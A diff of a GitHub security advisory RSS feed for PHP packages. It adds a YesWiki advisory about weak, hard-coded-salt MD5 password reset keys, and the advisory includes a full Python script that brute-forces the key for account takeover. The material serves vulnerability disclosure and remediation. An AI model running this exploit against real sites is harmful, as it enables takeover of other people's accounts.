@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2024-10-31T17:01:15.119Z</updated>
+    <updated>2024-10-31T18:01:41.718Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,136 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[yeswiki/yeswiki] YesWiki Uses a Broken or Risky Cryptographic Algorithm]]></title>
+        <id>https://github.com/advisories/GHSA-4fvx-h823-38v3</id>
+        <link href="https://github.com/advisories/GHSA-4fvx-h823-38v3"/>
+        <updated>2024-10-31T17:12:38.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The use of a weak cryptographic algorithm and a hard-coded salt to hash the password reset key allows it to be recovered and used to reset the password of any account.</p>
+<h3 id="details">Details</h3>
+<p>Firstly, the salt used to hash the password reset key is hard-coded in the <code>includes/services/UserManager.php</code> file at line <code>36</code> :</p>
+<pre><code class="language-php">private const PW_SALT = 'FBcA';
+</code></pre>
+<p>Next, the application uses a weak cryptographic algorithm to hash the password reset key. The hash algorithm is defined in the <code>includes/services/UserManager.php</code> file at line <code>201</code> :</p>
+<pre><code class="language-php">protected function generateUserLink($user)
+{
+    // Generate the password recovery key
+    $key = md5($user['name'] . '_' . $user['email'] . random_int(0, 10000) . date('Y-m-d H:i:s') . self::PW_SALT);
+</code></pre>
+<p>The key is generated from the <strong>user's name</strong>, <strong>e-mail address</strong>, a random number <strong>between 0 and 10000</strong>, the <strong>current date</strong> of the request and the <strong>salt</strong>.
+If we know the user's name and e-mail address, we can retrieve the key and use it to reset the account password with a bit of brute force on the random number.</p>
+<h3 id="proof-of-concept-poc">Proof of Concept (PoC)</h3>
+<p>To demonstrate the vulnerability, I created a python script to automatically retrieve the key and reset the password of a provided username and email.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# Author: Nishacid
+# YesWiki &lt;= 4.4.4 Account Takeover via Weak Password Reset Crypto
+
+from hashlib import md5
+from requests import post, get
+from base64 import b64encode
+from sys import exit
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from argparse import ArgumentParser
+
+# Known data
+salt = 'FBcA' # Hardcoded salt 
+random_range = 10000  # Range for random_int()
+WORKERS = 20 # Number of workers
+
+# Arguments
+def parseArgs():
+    parser = ArgumentParser()
+    parser.add_argument("-u", "--username", dest="username", default=None, help="Username of the account", required=True)
+    parser.add_argument("-e", "--email", dest="email", default=None, help="Email of the account", required=True)
+    parser.add_argument("-d", "--domain", dest="domain", default=None, help="Domain of the target", required=True)
+    return parser.parse_args()
+
+# Reset password request and get timestamp  
+def reset_password(email: str, domain: str):
+    response = post(
+        f'{domain}?MotDePassePerdu',
+        data={
+            'email': email, 
+            'subStep': '1'
+        },
+        headers={
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    )
+    if response.ok:
+        timestamp = datetime.now() # obtain the timestamp
+        timestamp = timestamp.strftime('%Y-%m-%d %H:%M:%S')
+        print(f"[*] Requesting link for {email} at {timestamp}")
+        return timestamp
+    else:
+        print("[-] Error while resetting password.")
+        exit()
+
+# Generate and check keys
+def check_key(random_int_val: int, timestamp_req: str, domain: str, username: str, email: str):
+    user_base64 = b64encode(username.encode()).decode()
+    data = f"{username}_{email}{random_int_val}{timestamp_req}{salt}"
+    hash_candidate = md5(data.encode()).hexdigest()
+    url = f"{domain}?MotDePassePerdu&amp;a=recover&amp;email={hash_candidate}&amp;u={user_base64}"
+    # print(f"[*] Checking {url}")
+    response = get(url)
+    
+    # Check if the link is valid, warning depending on the language
+    if '&lt;strong&gt;Bienvenu.e' in response.text or '&lt;strong&gt;Welcome' in response.text:
+        return (True, random_int_val, hash_candidate, url)
+    return (False, random_int_val, None, None)
+
+def main(timestamp_req: str, domain: str, username: str, email: str):
+    # Launch the brute-force
+    print(f"[*] Starting brute-force, it can take few minutes...")
+    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
+        futures = [executor.submit(check_key, i, timestamp_req, domain, username, email) for i in range(random_range + 1)]
+        
+        for future in as_completed(futures):
+            success, random_int_val, hash_candidate, url = future.result()
+            if success:
+                print(f"[+] Key found ! random_int: {random_int_val}, hash: {hash_candidate}")
+                print(f"[+] URL: {url}")
+                exit()
+        else:
+            print("[-] Key not found.")
+
+if __name__ == "__main__":
+    args = parseArgs()
+    timestamp_req = reset_password(args.email, args.domain)
+    main(timestamp_req, args.domain, args.username, args.email)
+</code></pre>
+<p>Simply run this script with the arguments <code>-u</code> for the username, <code>-e</code> for the email and <code>-d</code> for the target domain.</p>
+<pre><code class="language-bash">» python3 expoit.py --username 'admin' --email 'admin@nishacid.local' --domain 'http://localhost/' 
+[*] Requesting link for admin@nishacid.local at 2024-10-30 10:46:48
+[*] Starting brute-force, it can take few minutes...
+[+] Key found ! random_int: 9264, hash: 22a2751f50ba74b259818394d34020c9
+[+] URL: http://localhost/?MotDePassePerdu&amp;a=recover&amp;email=22a2751f50ba74b259818394d34020c9&amp;u=YWRtaW4K
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Many impacts are possible, the most obvious being account takeover, which can lead to theft of sensitive data, modification of website content, addition/deletion of administrator accounts, user identity theft, etc.</p>
+<h3 id="recommendation">Recommendation</h3>
+<p>The safest solution is to replace the salt with a random one and the hash algorithm with a more secure one.
+For example, you can use <a href="https://www.php.net/manual/en/function.random-bytes.php">random bytes</a> instead of a random integer.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/YesWiki/yeswiki/security/advisories/GHSA-4fvx-h823-38v3">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-4fvx-h823-38v3</a></li>
+<li><a href="https://github.com/YesWiki/yeswiki/commit/b5a8f93b87720d5d5f033a4b3a131ce0fb621dbc">https://github.com/YesWiki/yeswiki/commit/b5a8f93b87720d5d5f033a4b3a131ce0fb621dbc</a></li>
+<li><a href="https://github.com/YesWiki/yeswiki/commit/e1285709f6f6a2277bd0075acf369f33cefd78f7">https://github.com/YesWiki/yeswiki/commit/e1285709f6f6a2277bd0075acf369f33cefd78f7</a></li>
+<li><a href="https://github.com/advisories/GHSA-4fvx-h823-38v3">https://github.com/advisories/GHSA-4fvx-h823-38v3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4fvx-h823-38v3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-10-31T17:12:35.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[topthink/thinkphp] ThinkPHP deserialization vulnerability]]></title>
         <id>https://github.com/advisories/GHSA-pjhx-j53p-c5f5</id>
@@ -447,27 +577,6 @@
             <name>GitHub</name>
             <email>GitHub@noreply.github.com</email>
             <uri>https://github.com/advisories/GHSA-vw6x-c5rg-jmjp</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-10-25T21:31:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[funadmin/funadmin] SQL injection in funadmin]]></title>
-        <id>https://github.com/advisories/GHSA-6j8f-88mh-r9vq</id>
-        <link href="https://github.com/advisories/GHSA-6j8f-88mh-r9vq"/>
-        <updated>2024-10-29T21:50:16.000Z</updated>
-        <content type="html"><![CDATA[<p>Funadmin v5.0.2 has an arbitrary file read vulnerability in /curd/index/editfile.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48224">https://nvd.nist.gov/vuln/detail/CVE-2024-48224</a></li>
-<li><a href="https://github.com/funadmin/funadmin/issues/24">https://github.com/funadmin/funadmin/issues/24</a></li>
-<li><a href="https://github.com/advisories/GHSA-6j8f-88mh-r9vq">https://github.com/advisories/GHSA-6j8f-88mh-r9vq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6j8f-88mh-r9vq</uri>
         </author>
         <category label="severity" term="HIGH"/>
         <published>2024-10-25T21:31:27.000Z</published>
